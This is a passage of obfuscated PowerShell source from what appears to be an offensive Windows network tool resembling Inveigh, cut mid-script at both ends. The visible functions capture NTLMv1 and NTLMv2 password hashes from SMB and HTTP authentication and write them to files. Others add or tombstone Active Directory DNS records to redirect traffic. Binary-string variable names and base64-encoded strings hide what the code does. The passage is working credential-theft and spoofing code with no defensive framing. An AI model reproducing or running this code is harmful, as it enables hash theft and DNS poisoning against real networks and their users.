            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABEAA==')))
            {
                ${01110100101111101} = "1C"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABFAA==')))
            {
                ${01110100101111101} = "1D"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABGAA==')))
            {
                ${01110100101111101} = "1E"
            }
        }
        return ${01110100101111101}
    }
    function _01011111100111001([Int]${_01110100001100111}, [Byte[]]${_00001010100001011})
    {
        ${10011110100111100} = ${_00001010100001011}[12]
        if(${10011110100111100} -gt 0)
        {
            ${01100001111100111} = 0
            ${10101111011110010} = ''
            do
            {
                ${10101111011110010} += [System.Text.Encoding]::UTF8.GetString(${_00001010100001011}[(${_01110100001100111} + 1)..(${_01110100001100111} + ${10011110100111100})])
                ${_01110100001100111} += ${10011110100111100} + 1
                ${10011110100111100} = ${_00001010100001011}[${_01110100001100111}]
                ${01100001111100111}++
                if(${10011110100111100} -gt 0)
                {
                    ${10101111011110010} += "."
                }
            }
            until(${10011110100111100} -eq 0 -or ${01100001111100111} -eq 127)
        }
        return ${10101111011110010}
    }
    function _00000110001100101
    {
        param(${_10011100111010000})
        foreach($field in ${_10011100111010000}.Values)
        {
            ${10000100000101111} += $field
        }
        return ${10000100000101111}
    }
    function _01100101100001011
    {
        param ($IP,${_01011101001101001},$Sessions,${_10010101010010110},${_01111001111010100},${_10011010001001010},${_01000001001001101},${_01010000001111111},${_00100001101001011},
        ${_10111100100111111},${_01111111101001110},${_10101000000111010},${_00010110000000111},${_10101011100011101},$Enumerate,${_00110001010100100})
        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if(${_10010101010010110} -and ${_10010101010010110} -isnot [Array]){${_10010101010010110} = @(${_10010101010010110})}
        if(${_01111001111010100} -and ${_01111001111010100} -isnot [Array]){${_01111001111010100} = @(${_01111001111010100})}
        if(${_10011010001001010} -and ${_10011010001001010} -isnot [Array]){${_10011010001001010} = @(${_10011010001001010})}
        if(${_01000001001001101} -and ${_01000001001001101} -isnot [Array]){${_01000001001001101} = @(${_01000001001001101})}
        if(${_01010000001111111} -and ${_01010000001111111} -isnot [Array]){${_01010000001111111} = @(${_01010000001111111})}
        if(${_00100001101001011} -and ${_00100001101001011} -isnot [Array]){${_00100001101001011} = @(${_00100001101001011})}
        if(${_10111100100111111} -and ${_10111100100111111} -isnot [Array]){${_10111100100111111} = @(${_10111100100111111})}
        ${10011011100011000} = New-Object PSObject
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AA=='))) ${00101000010000101}.enumerate.Count
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) ${_01011101001101001}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBzAA=='))) $Sessions
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAFUAcwBlAHIAcwA='))) ${_10010101010010110}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAEcAcgBvAHUAcABzAA=='))) ${_01111001111010100}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAA='))) ${_10011010001001010}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAHMA'))) ${_01000001001001101}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzAA=='))) ${_01010000001111111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzACAATQBhAHAAcABlAGQA'))) ${_00100001101001011}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAVQBzAGUAcgBzAA=='))) ${_10111100100111111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))) ${_01111111101001110}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBpAG4AZwA='))) ${_10101000000111010}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABTAGUAcgB2AGUAcgA='))) ${_00010110000000111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAZQBkAA=='))) ${_10101011100011101}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) $Enumeration
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) $Execution
        return ${10011011100011000}
    }
    function _10000101111010010
    {
        param ([String]${_01011011111110110},[String]${_00101111111011011},[String]${_01011101001101001},[String]$IP)
        if(${00101000010000101}.domain_mapping_table.${_01011011111110110})
        {
            $session = (${_00101111111011011} + "@" + ${00101000010000101}.domain_mapping_table.${_01011011111110110}).ToUpper()
            ${00100111100101010} = (${_01011101001101001} + "." + ${00101000010000101}.domain_mapping_table.${_01011011111110110}).ToUpper()
        }
        else
        {
            $session = ${_01011011111110110} + "\" + ${_00101111111011011}
        }
        for(${01100001111100111} = 0;${01100001111100111} -lt ${00101000010000101}.enumerate.Count;${01100001111100111}++)
        {
            if(${00101000010000101}.enumerate[${01100001111100111}].Hostname -eq ${00100111100101010} -or ${00101000010000101}.enumerate[${01100001111100111}].IP -eq $IP)
            {
                if(!${00101000010000101}.enumerate[${01100001111100111}].Hostname)
                {
                    ${00101000010000101}.enumerate[${00000100011010011}].Hostname = ${00100111100101010}
                }
                [Array]${10010010000111011} = ${00101000010000101}.enumerate[${01100001111100111}].Sessions
                if(${00101000010000101}.domain_mapping_table.${_01011011111110110})
                {
                    for(${00111010100111110} = 0;${00111010100111110} -lt ${10010010000111011}.Count;${00111010100111110}++)
                    {
                        if(${10010010000111011}[${00111010100111110}] -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADAAMQAxADAAMQAxADEAMQAxADEAMQAwADEAMQAwAH0AXAAqAA=='))))
                        {
                            ${00110110100010101} = (${10010010000111011}[${00111010100111110}].Split("\"))[1]
                            ${10110100011100110} = ${00110110100010101} + "@" + ${00101000010000101}.domain_mapping_table.${_01011011111110110}
                            ${10010010000111011}[${00111010100111110}] += ${10110100011100110}
                            ${00101000010000101}.enumerate[${01100001111100111}].Sessions = ${10010010000111011}
                        }
                    }
                }
                if(${10010010000111011} -notcontains $session)
                {
                    ${10010010000111011} += $session
                    ${00101000010000101}.enumerate[${01100001111100111}].Sessions = ${10010010000111011}
                }
                ${01100001011110101} = $true
                break
            }
        }
        if(!${01100001011110101})
        {
            ${00101000010000101}.enumerate.Add((_01100101100001011 -IP $IP -_01011101001101001 ${00100111100101010} -Sessions $session)) > $null
        }
    }
}
${00011100010001110} =
{
    function _10100001000011001
    {
        param ([Byte[]]${_00000010100101000},[String]${_01100001100000100},[String]${_10101110100101010},[String]${_01001101011100110},[String]${_01000010101000110},[String]${_00010000100101000})
        ${00000100001100110} = [System.BitConverter]::ToString(${_00000010100101000})
        ${00000100001100110} = ${00000100001100110} -replace "-",""
        ${10111011100011100} = ${00000100001100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        $session = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AOgAkAHsAXwAwADEAMAAwADEAMQAwADEAMAAxADEAMQAwADAAMQAxADAAfQA=')))
        if((${_00010000100101000} -Like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAqAA=='))) -or ${10111011100011100} -gt 0) -and ${00000100001100110}.SubString((${10111011100011100} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzADAAMAAwADAAMAAwAA=='))))
        {
            ${10100100110110101} = ${10111011100011100} / 2
            ${00001100101011000} = _01111000101011100 (${10100100110110101} + 12) ${_00000010100101000}
            ${01100001010101110} = _01000101000111111 (${10100100110110101} + 16) ${_00000010100101000}
            ${01000101100110010} = [System.BitConverter]::ToString(${_00000010100101000}[(${10100100110110101} + ${01100001010101110})..(${10100100110110101} + ${01100001010101110} + ${00001100101011000} - 1)]) -replace "-",""
            ${10010000011011001} = _01111000101011100 (${10100100110110101} + 20) ${_00000010100101000}
            ${10111101101101100} = _01000101000111111 (${10100100110110101} + 24) ${_00000010100101000}
            ${00111110101111111} = [System.BitConverter]::ToString(${_00000010100101000}[(${10100100110110101} + ${10111101101101100})..(${10100100110110101} + ${10111101101101100} + ${10010000011011001} - 1)]) -replace "-",""
            ${00111010110000011} = _01111000101011100 (${10100100110110101} + 28) ${_00000010100101000}
            ${01111011100100001} = _01000101000111111 (${10100100110110101} + 32) ${_00000010100101000}
            if(${00111010110000011} -gt 0)
            {
                ${01100000111100110} = _01010001111100011 (${10100100110110101} + ${01111011100100001}) ${00111010110000011} ${_00000010100101000}
            }
            ${10011110110111000} = _01111000101011100 (${10100100110110101} + 36) ${_00000010100101000}
            ${00110000111100110} = _01000101000111111 (${10100100110110101} + 40) ${_00000010100101000}
            ${00000011001101111} = _01010001111100011 (${10100100110110101} + ${00110000111100110}) ${10011110110111000} ${_00000010100101000}
            ${01011111111100000} = _01111000101011100 (${10100100110110101} + 44) ${_00000010100101000}
            ${00110010101101110} = _01000101000111111 (${10100100110110101} + 48) ${_00000010100101000}
            ${10111100011111110} = _01010001111100011 (${10100100110110101} + ${00110010101101110}) ${01011111111100000} ${_00000010100101000}
            if(${_00010000100101000} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIA'))))
            {
                ${10011110101000110} = ${00101000010000101}.SMB_session_table.$session
            }
            elseif(${_00010000100101000} -Like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAqAA=='))))
            {
                ${10011110101000110} = ${00101000010000101}.HTTP_session_table.$session
            }
            if(${10010000011011001} -gt 24)
            {
                ${01110001110011000} = ${00111110101111111}.Insert(32,':')
                ${00011101100001010} = ${00000011001101111} + "::" + ${01100000111100110} + ":" + ${10011110101000110} + ":" + ${01110001110011000}
                if(${_01100001100000100} -eq 'Y')
                {
                    if(${00101000010000101}.machine_accounts -or (!${00101000010000101}.machine_accounts -and -not ${00000011001101111}.EndsWith('$')))
                    {
                        ${00101000010000101}.NTLMv2_list.Add(${00011101100001010}) > $null
                        if(!${00101000010000101}.console_unique -or (${00101000010000101}.console_unique -and ${00101000010000101}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A')))))
                        {
                            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv2 captured for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:") > $null
                            ${00101000010000101}.output_queue.Add(${00011101100001010}) > $null
                        }
                        else
                        {
                            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv2 captured for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[not unique]") > $null
                        }
                        if(${00101000010000101}.file_output -and (!${00101000010000101}.file_unique -or (${00101000010000101}.file_unique -and ${00101000010000101}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A'))))))
                        {
                            ${00101000010000101}.NTLMv2_file_queue.Add(${00011101100001010}) > $null
                            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv2 written to " + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAtAE4AVABMAE0AdgAyAC4AdAB4AHQA')))) > $null
                        }
                        if(${00101000010000101}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A'))))
                        {
                            ${00101000010000101}.NTLMv2_username_list.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A')))) > $null
                        }
                        if(${00101000010000101}.IP_capture_list -notcontains ${_10101110100101010} -and -not ${00000011001101111}.EndsWith('$') -and !${00101000010000101}.spoofer_repeat -and ${_10101110100101010} -ne $IP)
                        {
                            ${00101000010000101}.IP_capture_list.Add(${_10101110100101010}) > $null
                        }
                    }
                    else
                    {
                        ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv2 ignored for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[machine account]") > $null    
                    }
                }
                else
                {
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv2 ignored for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[capture disabled]") > $null    
                }
            }
            elseif(${10010000011011001} -eq 24)
            {
                ${00001100000010100} = ${00000011001101111} + "::" + ${01100000111100110} + ":" + ${01000101100110010} + ":" + ${00111110101111111} + ":" + ${10011110101000110}
                if(${_01100001100000100} -eq 'Y')
                {
                    if(${00101000010000101}.machine_accounts -or (!${00101000010000101}.machine_accounts -and -not ${00000011001101111}.EndsWith('$')))
                    {
                        ${00101000010000101}.NTLMv1_list.Add(${00001100000010100}) > $null
                        if(!${00101000010000101}.console_unique -or (${00101000010000101}.console_unique -and ${00101000010000101}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A')))))
                        {
                            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_01000010101000110}) NTLMv1 captured for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:") > $null
                            ${00101000010000101}.output_queue.Add(${00001100000010100}) > $null
                        }
                        else
                        {
                            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_01000010101000110}) NTLMv1 captured for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[not unique]") > $null
                        }
                        if(${00101000010000101}.file_output -and (!${00101000010000101}.file_unique -or (${00101000010000101}.file_unique -and ${00101000010000101}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A'))))))
                        {
                            ${00101000010000101}.NTLMv1_file_queue.Add(${00001100000010100}) > $null
                            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] SMB(${_01000010101000110}) NTLMv1 written to " + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAtAE4AVABMAE0AdgAxAC4AdAB4AHQA')))) > $null
                        }
                        if(${00101000010000101}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A'))))
                        {
                            ${00101000010000101}.NTLMv1_username_list.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AIAAkAHsAMAAxADEAMAAwADAAMAAwADEAMQAxADEAMAAwADEAMQAwAH0AXAAkAHsAMAAwADAAMAAwADAAMQAxADAAMAAxADEAMAAxADEAMQAxAH0A')))) > $null
                        }
                        if(${00101000010000101}.IP_capture_list -notcontains ${_10101110100101010} -and -not ${00000011001101111}.EndsWith('$') -and !${00101000010000101}.spoofer_repeat -and ${_10101110100101010} -ne $IP)
                        {
                            ${00101000010000101}.IP_capture_list.Add(${_10101110100101010}) > $null
                        }
                    }
                    else
                    {
                        ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv1 ignored for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[machine account]") > $null    
                    }
                }
                else
                {
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLMv1 ignored for ${01100000111100110}\${00000011001101111} from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}`:`n[capture disabled]") > $null    
                }
            }
            elseif(${10010000011011001} -eq 0)
            {
                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_00010000100101000}(${_01000010101000110}) NTLM null response from ${_10101110100101010}(${10111100011111110})`:${_01001101011100110}") > $null
            }
            _10000101111010010 ${01100000111100110} ${00000011001101111} ${10111100011111110} ${10100011000000011}
        }
    }
}
${00101111101110111} =
{
    function _10001101110101000
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$true)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]${_00001011001101001} = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
        ${10110001011001010} = _01010010111010000 -_10100000011110001 ${_10100000011110001} -_01111111110001111 ${_01111111110001111}
        ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        ${00111100010010100} = ${_01011011111110110}.Split(".")
        foreach(${00111100101111111} in ${00111100010010100})
        {
            ${10111000010110010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        if(${_10011000001001110})
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA='))),${_10011000001001110}.UserName,${_10011000001001110}.GetNetworkCredential().Password)
        }
        else
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA=')))
        }
        ${01100010100010100} = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAvADEALwAxADYAMAAxAA==')))).Ticks)
        ${01100010100010100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01100010100010100}))
        ${01100010100010100} = ${01100010100010100}.Split("-") | %{[System.Convert]::ToInt16($_,16)}
        [Byte[]]${01100010010100001} = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            ${10110001011001010}[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            ${01100010100010100}
        try
        {
            ${01000001100111001}.InvokeSet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAUgBlAGMAbwByAGQA'))),${01100010010100001})
            ${01000001100111001}.InvokeSet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAVABvAG0AYgBzAHQAbwBuAGUAZAA='))),$true)
            ${01000001100111001}.SetInfo()
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node ${_10000011100010111} tombstoned in ${_01111111110001111}") > $null
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        }
        if(${01000001100111001}.Path)
        {
            ${01000001100111001}.Close()
        }
    }
    function _10100011110010101
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01001100010001111},    
            [parameter(Mandatory=$false)][String]${_01110001110100011},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$true)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]${_00001011001101001} = "DomainDNSZones",
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]${_10110011101001001} = "A",
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][Byte[]]${_10001010010110110},
            [parameter(Mandatory=$false)][Int]${_00001011100010000},
            [parameter(Mandatory=$false)][Int]${_10010100101001111},
            [parameter(Mandatory=$false)][Int]${_01101000000110110},
            [parameter(Mandatory=$false)][Int]${_01000010101000110},
            [parameter(Mandatory=$false)][Int]${_00010010110111100} = 600,
            [parameter(Mandatory=$false)][Int32]${_10001100100001100},
            [parameter(Mandatory=$false)][Switch]${_10010010010111111},
            [parameter(Mandatory=$false)][Switch]${_00101110001111100},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
        ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        ${00111100010010100} = ${_01011011111110110}.Split(".")
        foreach(${00111100101111111} in ${00111100010010100})
        {
            ${10111000010110010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        [Byte[]]${_10001010010110110} = _01110111001011001 -_01001100010001111 ${_01001100010001111} -_10100000011110001 ${_10100000011110001} -_10110011101001001 ${_10110011101001001} -_00010010110111100 ${_00010010110111100} -_01111111110001111 ${_01111111110001111}
        if(${_10011000001001110})
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA='))),${_10011000001001110}.UserName,${_10011000001001110}.GetNetworkCredential().Password)
        }
        else
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA=')))
        }
        try
        {
            ${01000001100111001}.InvokeSet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAUgBlAGMAbwByAGQA'))),${_10001010010110110})
            ${01000001100111001}.SetInfo()
            ${01101111011000011} = $true
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node ${_10000011100010111} added to ${_01111111110001111}") > $null;
            ${00101000010000101}.ADIDNS_table.${_10000011100010111} = "1"
        }
        catch
        {
            ${01101111011000011} = $false
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
            ${00101000010000101}.ADIDNS_table.${_10000011100010111} = "0"
        }
        if(${01000001100111001}.Path)
        {
            ${01000001100111001}.Close()
        }
        return ${01101111011000011}
    }
    function _01111110110011010
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01110001110100011},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$true)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]${_00001011001101001} = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
